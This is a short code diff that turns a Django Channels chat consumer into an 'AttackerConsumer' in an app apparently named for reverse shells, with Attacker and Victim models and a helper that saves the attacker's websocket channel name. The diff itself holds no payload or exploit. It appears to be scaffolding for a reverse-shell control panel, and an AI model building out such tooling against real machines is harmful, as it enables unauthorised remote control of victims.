@@ -1,18 +1,14 @@
 import json
+from channels.db import database_sync_to_async
+from reverse_shell.models import Attacker, Victim
 from channels.generic.websocket import AsyncWebsocketConsumer
 
 
-class ChatConsumer(AsyncWebsocketConsumer):
+class AttackerConsumer(AsyncWebsocketConsumer):
     async def connect(self):
-        self.room_name = self.scope['url_route']['kwargs']['room_name']
-        self.room_group_name = 'chat_%s' % self.room_name
-
-        # Join room group
-        await self.channel_layer.group_add(
-            self.room_group_name,
-            self.channel_name
-        )
-
+        user = self.scope['user']
+        print(user)
+        await self.set_channel_name(user)
         await self.accept()
 
     async def disconnect(self, close_code):
@@ -44,3 +40,9 @@ class ChatConsumer(AsyncWebsocketConsumer):
         await self.send(text_data=json.dumps({
             'message': message
         }))
+
+    @database_sync_to_async
+    def set_channel_name(self, user):
+        attacker = Attacker.objects.get(owner=user)
+        attacker.channel_name = self.channel_name
+        attacker.save()
